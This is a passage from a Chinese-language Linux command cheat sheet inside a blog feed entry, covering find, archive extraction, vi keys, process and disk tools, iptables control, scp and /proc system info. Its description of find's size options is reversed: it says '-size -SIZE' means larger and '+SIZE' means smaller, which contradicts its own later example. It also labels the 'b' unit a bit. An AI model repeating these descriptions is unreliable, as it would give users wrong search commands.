class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find [PATH] [option] [action]</span><br></pre></td></tr></table></figure><p><strong>find参数：基于文件名的搜索</strong></p><ul><li>与文件名有关的参数如下<ul><li><code>-name filename</code>：查找文件名为<code>filename</code>的文件。<code>filename</code>可使用正则表达式表示</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@www ~] # find / -name passwd</span><br></pre></td></tr></table></figure><p>查找文件名为<code>passwd</code>的文件</p><p><strong>find参数：基于文件大小的搜索</strong></p><ul><li>与文件大小有关的参数如下<ul><li><code>-size SIZE</code>：查找文件大小刚好等于SIZE的文件</li><li><code>-size -SIZE</code>：查找文件大小大于SIZE的文件</li><li><code>-size +SIZE</code>：查找文件大小小于SIZE的文件</li></ul></li></ul><blockquote><p>其中，SIZE的单位有</p></blockquote><ul><li><code>c</code> —— <code>byte</code>，字节；</li><li><code>w</code> —— 字（2字节）；</li><li><code>b</code> —— <code>bit</code>，块（512字节）；</li><li><code>k</code> —— 千字节；</li><li><code>M</code> —— 兆字节；</li><li><code>G</code> —— 吉字节</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@www ~] <span class="comment"># find . -type f -size +10k</span></span><br><span class="line">搜索大于10KB的文件</span><br><span class="line">[root@www ~] <span class="comment"># find . -type f -size 10k</span></span><br><span class="line">搜索等于10KB的文件</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><ul><li>通常<code>find</code>不很常用，因为速度慢！</li><li>通常都是先使用<code>whereis</code>或者<code>locate</code>来检查，当真的找不到了，才用<code>find</code>查找</li></ul><h2 id="三、压缩解压命令"><a href="#三、压缩解压命令" class="headerlink" title="三、压缩解压命令"></a>三、压缩解压命令</h2><ul><li><code>*.tar</code> 用 <code>tar -xvf</code> 解压</li><li><code>*.gz</code> 用 <code>gzip -d</code>或者<code>gunzip</code> 解压</li><li><code>*.tar.gz</code>和<code>*.tgz</code> 用 <code>tar -xzf</code> 解压</li><li><code>*.bz2</code> 用<code>bzip2 -d</code>或者用<code>bunzip2</code> 解压</li><li><code>*.tar.bz2</code>用<code>tar -xjf</code> 解压</li><li><code>*.Z</code> 用 <code>uncompress</code> 解压</li><li><code>*.tar.Z</code> 用<code>tar -xZf</code> 解压</li><li><code>*.rar</code> 用 <code>unrar e</code>解压</li><li><code>*.zip</code> 用 <code>unzip</code> 解压</li></ul><h2 id="四、VI相关"><a href="#四、VI相关" class="headerlink" title="四、VI相关"></a>四、VI相关</h2><ul><li>定位到头尾 <ul><li><code>G</code> 定位到尾</li><li><code>1G</code> 定位到头</li><li><code>nG</code> 定位到指定行</li></ul></li><li>复制<ul><li>复制一行 <ul><li><code>yy</code> 复制当前行</li></ul></li><li>复制多行<ul><li><code>7yy</code> 从当前行开始复制<code>７</code>行</li></ul></li><li>复制当前到行尾的内容 <ul><li><code>y$</code></li></ul></li></ul></li><li>粘贴<ul><li><code>p</code> </li><li>大写<code>P</code>代表贴至游标前</li></ul></li><li>选择复制<ul><li><code>v</code>进入可视化</li></ul></li><li>删除<ul><li>删除一行<ul><li><code>dd</code></li></ul></li><li>剪切至行首 <ul><li><code>d^</code></li></ul></li><li>剪切至行尾 <ul><li><code>d$</code></li></ul></li></ul></li><li>搜索 <code>/</code>搜索的关键字，按<code>n</code>切换下一个关键字</li></ul><h2 id="五、磁盘管理"><a href="#五、磁盘管理" class="headerlink" title="五、磁盘管理"></a>五、磁盘管理</h2><ul><li>查看内存使用情况： <code>free -m</code>  (<code>m</code>为<code>MB</code>，<code>g</code>为<code>GB</code>)</li><li>查看对应磁盘使用情况： <code>df -h</code></li></ul><h2 id="六、进程管理"><a href="#六、进程管理" class="headerlink" title="六、进程管理"></a>六、进程管理</h2><ul><li><code>pkill</code>  根据进程名杀死进程</li><li><code>ps</code> 列出系统中运行的进程，包括进程号、命令、CPU使用量、内存使用量<ul><li><code>ps -a</code> 列出所有运行中/激活进程</li><li><code>ps -ef |grep processName</code> 列出需要进程</li><li><code>ps -aux</code> 显示进程信息</li></ul></li><li><code>pstree</code> <code>linux</code>中，每一个进程都是由其父进程创建的。此命令以可视化方式显示进程，通过显示进程的树状图来展示进程间关系</li><li><code>top</code> <ul><li>可以监视系统中不同的进程所使用的资源</li><li>显示进程的数据包括<code>PID</code>、进程属主、优先级、<code>%CPU</code>、<code>%memory</code>等。可以使用这些显示指示出资源使用量</li></ul></li></ul><h2 id="七、网络管理"><a href="#七、网络管理" class="headerlink" title="七、网络管理"></a>七、网络管理</h2><p><strong>7.1 下载源管理</strong></p><ul><li><code>yum list | grep nginx</code> 查看是否有<code>Nginx</code>源</li></ul><p><strong>7.2 防火墙相关</strong></p><blockquote><p><code>linux</code>查看防火墙状态及开启关闭命令</p></blockquote><ul><li><strong>service方式</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看防火墙状态</span></span><br><span class="line"></span><br><span class="line">[root@centos6 ~]<span class="comment"># service iptables status</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启防火墙</span></span><br><span class="line"></span><br><span class="line">[root@centos6 ~]<span class="comment"># service iptables start</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭防火墙</span></span><br><span class="line">[root@centos6 ~]<span class="comment"># service iptables stop</span></span><br></pre></td></tr></table></figure><p><strong>iptables方式</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@centos6 ~]<span class="comment"># cd /etc/init.d/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看状态</span></span><br><span class="line">[root@centos6 init.d]<span class="comment"># /etc/init.d/iptables status</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暂时关闭防火墙 </span></span><br><span class="line">[root@centos6 init.d]<span class="comment"># /etc/init.d/iptables stop</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># iptables</span></span><br><span class="line">[root@centos6 init.d]<span class="comment"># /etc/init.d/iptables restart</span></span><br></pre></td></tr></table></figure><ul><li><code>linux</code>的防火墙是否阻止80端口<ul><li>返回有内容说明开通，没返回内容，则说明阻止</li><li><code>iptables -vnL | grep &quot;:80 &quot;</code></li></ul></li></ul><h2 id="八、上传文件相关"><a href="#八、上传文件相关" class="headerlink" title="八、上传文件相关"></a>八、上传文件相关</h2><ul><li>从远处复制文件到本地目录 <ul><li><code>scp root@10.10.10.10:/opt/soft/nginx-0.5.38.tar.gz /opt/soft/</code></li></ul></li><li>上传本地目录到远程机器指定目录(拷贝目录带上<code>-r</code>,递归复制)<ul><li><code>scp -r /opt/soft/mongodb root@10.10.10.10:/opt/soft/scptest</code></li></ul></li></ul><h2 id="九、系统相关"><a href="#九、系统相关" class="headerlink" title="九、系统相关"></a>九、系统相关</h2><p><strong>9.1 CPU管理</strong></p><ul><li>查看对应CPU使用情况<ul><li><code>cat /proc/cpuinfo</code></li></ul></li><li>只显示一行对应的CPU型号以及其他信息 <ul><li><code>cat  /proc/cpuinfo | grep &quot;model name&quot; | head -1</code></li></ul></li><li>系统有几个核就会显示几行<ul><li><code>cat  /proc/cpuinfo | grep &quot;model name&quot;</code></li></ul></li><li>统计出一共有多少核<ul><li><code>cat  /proc/cpuinfo | grep &quot;model name&quot; | wc -l</code></li></ul></li></ul><p><strong>9.2其他</strong></p><ul><li>查看对应服务器版本当前操作系统发行版信息<ul><li><code>cat /etc/issue</code>  或  <code>cat /etc/redhat-release</code></li></ul></li><li>查看更为底层的版本信息： <code>cat /proc/version</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、文件管理&quot;&gt;&lt;a href=&quot;#一、文件管理&quot; class=&quot;headerlink&quot; title=&quot;一、文件管理&quot;&gt;&lt;/a&gt;一、文件管理&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1.1 创建删除文件&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mkdir&lt;/
      
    
    </summary>
    
      <category term="Back-end" scheme="http://blog.poetries.top/categories/Back-end/"/>
    
    
      <category term="Linux" scheme="http://blog.poetries.top/tags/Linux/"/>
    
  </entry>
  
</feed>
